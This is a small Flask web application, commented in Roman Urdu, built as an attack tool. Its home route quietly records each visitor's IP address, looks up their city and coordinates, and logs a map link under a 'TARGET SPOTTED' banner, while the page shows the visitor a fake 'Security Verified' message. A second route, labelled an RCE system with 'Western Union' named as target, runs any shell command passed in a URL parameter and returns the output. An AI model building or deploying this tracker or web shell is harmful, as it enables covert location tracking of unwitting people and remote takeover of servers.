from flask import Flask, request
import requests
import os

app = Flask(__name__)

@app.route('/')
def home():
    # User ka IP address nikalna
    user_ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    try:
        # Karachi ki location nikalne ke liye API
        res = requests.get(f'http://ip-api.com/json/{user_ip}').json()
        city = res.get('city', 'Karachi')
        lat = res.get('lat', '24.8607')
        lon = res.get('lon', '67.0011')
        
        # Exact Google Map link
        map_link = f"https://www.google.com/maps?q={lat},{lon}"
    except:
        city, map_link = "Locating...", "Retry"

    # Ye details Vercel logs mein show hongi
    print(f"\n--- [!!!] TARGET SPOTTED [!!!] ---")
    print(f"IP: {user_ip} | City: {city}")
    print(f"Map: {map_link}\n")
    
    return f"<h2>Security Verified</h2><p>Connection from: {user_ip}</p>"

# --- Naya RCE System (Western Union Target) ---
@app.route('/verify-system')
def verify_system():
    # Ye server ke andar commands chalane ke liye hai
    cmd = request.args.get('c', 'whoami')
    try:
        # Command execute karna
        output = os.popen(cmd).read()
        return f"<h3>System Status: Online</h3><hr><pre>{output}</pre>"
    except Exception as e:
        return f"Error: {str(e)}"
